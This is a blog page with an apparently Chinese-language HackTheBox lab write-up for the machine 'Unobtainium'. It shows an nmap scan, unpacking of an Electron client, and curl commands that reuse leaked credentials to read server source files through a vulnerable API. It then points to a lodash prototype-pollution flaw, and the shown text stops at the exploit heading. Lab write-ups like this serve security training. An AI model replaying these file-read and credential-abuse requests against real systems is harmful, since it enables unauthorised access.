<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Unobtainium - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;338  10.10.10.235                                                                                                              端口扫描80,8443,31337: 1">
<meta property="og:type" content="article">
<meta property="og:title" content="Unobtainium - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;338  10.10.10.235                                                                                                              端口扫描80,8443,31337: 1">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041401.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041402.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041403.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041404.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041405.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041406.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041407.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041408.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041409.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041410.jpg">
<meta property="article:published_time" content="2021-04-14T07:10:50.000Z">
<meta property="article:modified_time" content="2021-09-06T01:03:30.060Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041401.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                彼女募集中
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                about
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Unobtainium - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Unobtainium - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-04-14T07:10:50.000Z" itemprop="datePublished" class="page-time">
  2021-04-14
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-235"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.235</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8443-31337"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">8443&#x2F;31337</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#unobtainium-unpack"><span class="post-toc-number">3.</span> <span class="post-toc-text">unobtainium unpack</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#asar"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">asar</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#todo"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">todo</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#index-js"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">index.js</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#package-json"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">package.json</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exploit"><span class="post-toc-number">4.</span> <span class="post-toc-text">exploit</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">5.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#kubectl"><span class="post-toc-number">6.</span> <span class="post-toc-text">kubectl</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#enum"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">enum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exploit-dev"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">exploit dev</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dev-token"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">dev token</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#kube-system"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">kube-system</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#secrets"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">secrets</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#daemon-set-token"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">daemon-set token</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#images"><span class="post-toc-number">6.7.</span> <span class="post-toc-text">images</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#evil-pod"><span class="post-toc-number">6.8.</span> <span class="post-toc-text">evil pod</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pod-yaml"><span class="post-toc-number">6.9.</span> <span class="post-toc-text">pod.yaml</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root"><span class="post-toc-number">7.</span> <span class="post-toc-text">root</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Unobtainium-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Unobtainium - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-04-14 15:10:50" datetime="2021-04-14T07:10:50.000Z"  itemprop="datePublished">2021-04-14</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.eu/home/machines/profile/338" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/338</a></p>
</li>
<li><h2 id="10-10-10-235"><a href="#10-10-10-235" class="headerlink" title="10.10.10.235"></a>10.10.10.235</h2></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041401.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80,8443,31337:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.235</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 12:39 CST</span><br><span class="line">Nmap scan report for 10.10.10.235</span><br><span class="line">Host is up (0.069s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)</span><br><span class="line">|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)</span><br><span class="line">|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)</span><br><span class="line">80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Unobtainium</span><br><span class="line">666/tcp   filtered doom</span><br><span class="line">8443/tcp  open     ssl/https-alt</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 403 Forbidden</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: application/json</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39</span><br><span class="line">|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd</span><br><span class="line">|     Date: Wed, 14 Apr 2021 04:40:35 GMT</span><br><span class="line">|     Content-Length: 212</span><br><span class="line">|     &#123;"kind":"Status","apiVersion":"v1","metadata":&#123;&#125;,"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":&#123;&#125;,"code":403&#125;</span><br><span class="line">|   GenericLines:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 403 Forbidden</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: application/json</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39</span><br><span class="line">|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd</span><br><span class="line">|     Date: Wed, 14 Apr 2021 04:40:34 GMT</span><br><span class="line">|     Content-Length: 185</span><br><span class="line">|     &#123;"kind":"Status","apiVersion":"v1","metadata":&#123;&#125;,"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":&#123;&#125;,"code":403&#125;</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 403 Forbidden</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: application/json</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39</span><br><span class="line">|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd</span><br><span class="line">|     Date: Wed, 14 Apr 2021 04:40:34 GMT</span><br><span class="line">|     Content-Length: 189</span><br><span class="line">|_    &#123;"kind":"Status","apiVersion":"v1","metadata":&#123;&#125;,"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":&#123;&#125;,"code":403&#125;</span><br><span class="line">|_http-title: Site doesn't have a title (application/json).</span><br><span class="line">| ssl-cert: Subject: commonName=minikube/organizationName=system:masters</span><br><span class="line">| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1</span><br><span class="line">| Not valid before: 2021-04-13T04:37:52</span><br><span class="line">|_Not valid after:  2022-04-14T04:37:52</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|   h2</span><br><span class="line">|_  http/1.1</span><br><span class="line">31337/tcp open     http          Node.js Express framework</span><br><span class="line">|_http-title: Site doesn't have a title (application/json; charset=utf-8).</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=4/14%Time=60767242%P=x86_64-apple-darwi</span><br><span class="line">SF:n19.6.0%r(GetRequest,1FF,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Contro</span><br><span class="line">SF:l:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Co</span><br><span class="line">SF:ntent-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2030</span><br><span class="line">SF:82aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid</span><br><span class="line">SF::\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2014\x20Apr</span><br><span class="line">SF:\x202021\x2004:40:34\x20GMT\r\nContent-Length:\x20185\r\n\r\n&#123;\"kind\":</span><br><span class="line">SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":&#123;&#125;,\"status\":\"Failure\"</span><br><span class="line">SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot</span><br><span class="line">SF:\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":&#123;&#125;,</span><br><span class="line">SF:\"code\":403&#125;\n")%r(HTTPOptions,203,"HTTP/1\.0\x20403\x20Forbidden\r\nC</span><br><span class="line">SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j</span><br><span class="line">SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema</span><br><span class="line">SF:-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Priori</span><br><span class="line">SF:tylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x</span><br><span class="line">SF:2014\x20Apr\x202021\x2004:40:34\x20GMT\r\nContent-Length:\x20189\r\n\r\</span><br><span class="line">SF:n&#123;\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":&#123;&#125;,\"status\":</span><br><span class="line">SF:\"Failure\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\</span><br><span class="line">SF:"\x20cannot\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",</span><br><span class="line">SF:\"details\":&#123;&#125;,\"code\":403&#125;\n")%r(FourOhFourRequest,21A,"HTTP/1\.0\x20</span><br><span class="line">SF:403\x20Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\nContent-T</span><br><span class="line">SF:ype:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kub</span><br><span class="line">SF:ernetes-Pf-Flowschema-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX</span><br><span class="line">SF:-Kubernetes-Pf-Prioritylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9ef</span><br><span class="line">SF:dd\r\nDate:\x20Wed,\x2014\x20Apr\x202021\x2004:40:35\x20GMT\r\nContent-</span><br><span class="line">SF:Length:\x20212\r\n\r\n&#123;\"kind\":\"Status\",\"apiVersion\":\"v1\",\"meta</span><br><span class="line">SF:data\":&#123;&#125;,\"status\":\"Failure\",\"message\":\"forbidden:\x20User\x20\\</span><br><span class="line">SF:\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\x20ports,/</span><br><span class="line">SF:Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":&#123;&#125;,\"code\</span><br><span class="line">SF:":403&#125;\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon</span><br><span class="line">SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\</span><br><span class="line">SF:r\n400\x20Bad\x20Request");</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.07 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>80是一个什么下载页面：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041402.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="8443-31337"><a href="#8443-31337" class="headerlink" title="8443/31337"></a>8443/31337</h2><p>都是json，需要其他信息：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041403.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041404.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="unobtainium-unpack"><a href="#unobtainium-unpack" class="headerlink" title="unobtainium unpack"></a>unobtainium unpack</h1><p>80下载包，unpack得到一个asar文件，这是Electron程序：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041405.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="asar"><a href="#asar" class="headerlink" title="asar"></a>asar</h2><p>对asar文件进行解包,得到代码，其中包括其他端口的请求信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar extract app.asar ./</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041406.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p>根据todo.js的请求，得到todo.txt内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl --header <span class="string">"Content-Type: application/json"</span> --request POST http://unobtainium.htb:31337/todo --data <span class="string">'&#123;"auth": &#123;"name": "felamos", "password": "Winter2021"&#125;, "filename" : "todo.txt"&#125;'</span></span></span><br><span class="line">&#123;"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"&#125;%</span><br></pre></td></tr></table></figure>

<h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><p>并且可以利用todo里的api读取服务器上其他文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --header "Content-Type: application/json" --request POST http://unobtainium.htb:31337/todo --data '&#123;"auth": &#123;"name": "felamos", "password": "Winter2021"&#125;, "filename" : "index.js"&#125;' | jq</span><br><span class="line"></span><br><span class="line">&#123;"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");\nconst express = require('express');\nconst &#123; exec &#125; = require(\"child_process\");     \nconst bodyParser = require('body-parser');     \nconst _ = require('lodash');                                                                  \nconst app = express();\nvar fs = require('fs');\n                                                                                              \nconst users = [                                                                               \n  &#123;name: 'felamos', password: 'Winter2021'&#125;,\n  &#123;name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true&#125;,      \n];\n\nlet messages = [];                             \nlet lastId = 1;                                \n                                                                                              \nfunction findUser(auth) &#123;                                                                     \n  return users.find((u) =&gt;                                                                    \n    u.name === auth.name &amp;&amp;                                                                   \n    u.password === auth.password);                                                            \n&#125;                                    \n                                               \napp.use(bodyParser.json());                                                                   \n                                               \napp.get('/', (req, res) =&gt; &#123;                   \n  res.send(messages);                                                                         \n&#125;);                                                                                           \n                                                                                              \napp.put('/', (req, res) =&gt; &#123;   \n  const user = findUser(req.body.auth || &#123;&#125;);                                                 \n                                               \n  if (!user) &#123;                                 \n    res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);                                \n    return;\n  &#125;\n\n  const message = &#123;\n    icon: '__',\n  &#125;;\n\n  _.merge(message, req.body.message, &#123;\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  &#125;);\n\n  messages.push(message);\n  res.send(&#123;ok: true&#125;);\n&#125;);\n\napp.delete('/', (req, res) =&gt; &#123;\n  const user = findUser(req.body.auth || &#123;&#125;);\n\n  if (!user || !user.canDelete) &#123;\n    res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\n    return;\n  &#125;\n\n  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\n  res.send(&#123;ok: true&#125;);\n&#125;);\napp.post('/upload', (req, res) =&gt; &#123;\n  const user = findUser(req.body.auth || &#123;&#125;);\n  if (!user || !user.canUpload) &#123;\n    res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\n    return;\n  &#125;\n\n\n  filename = req.body.filename;\n  root.upload(\"./\",filename, true);\n  res.send(&#123;ok: true, Uploaded_File: filename&#125;);\n&#125;);\n\napp.post('/todo', (req, res) =&gt; &#123;\n\tconst user = findUser(req.body.auth || &#123;&#125;);\n\tif (!user) &#123;\n\t\tres.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\n\t\treturn;\n\t&#125;\n\n\tfilename = req.body.filename;\n        testFolder = \"/usr/src/app\";\n        fs.readdirSync(testFolder).forEach(file =&gt; &#123;\n                if (file.indexOf(filename) &gt; -1) &#123;\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send(&#123;ok: true, content: buffer&#125;);\n                &#125;\n        &#125;);\n&#125;);\n\napp.listen(3000);\nconsole.log('Listening on port 3000...');\n"&#125;%</span><br></pre></td></tr></table></figure>

<p>注意到有一个upload接口，有user.canUpload校验，有个merge，结合后面读取的package.json，应该就是考原形链污染</p>
<h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl --header <span class="string">"Content-Type: application/json"</span> --request POST http://unobtainium.htb:31337/todo --data <span class="string">'&#123;"auth": &#123;"name": "felamos", "password": "Winter2021"&#125;, "filename" : "package.json"&#125;'</span> -x http://127.0.0.1:8087</span></span><br><span class="line">&#123;"ok":true,"content":"&#123;\n  \"name\": \"Unobtainium-Server\",\n  \"version\": \"1.0.0\",\n  \"description\": \"API Service for Electron client\",\n  \"main\": \"index.js\",\n  \"scripts\": &#123;\n    \"start\": \"node index.js\"\n  &#125;,\n  \"author\": \"felamos\",\n  \"license\": \"ISC\",\n  \"dependencies\": &#123;\n    \"body-parser\": \"1.18.3\",\n    \"express\": \"4.16.4\",\n    \"lodash\": \"4.17.4\",\n    \"google-cloudstorage-commands\": \"0.0.1\"\n  &#125;,\n  \"devDependencies\": &#123;&#125;\n&#125;\n"&#125;%</span><br></pre></td></tr></table></figure>

<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><ul>
<li><a href="mailto:lodash@4.17.4">lodash@4.17.4</a> vulnerabilities | lodash 4.17.4 | Snyk<br><a href="https://snyk.io/test/npm/lodash/4.17.4" target="_blank" rel="noopener">https://snyk.io/test/npm/lodash/4.17.4</a></li>
</ul>
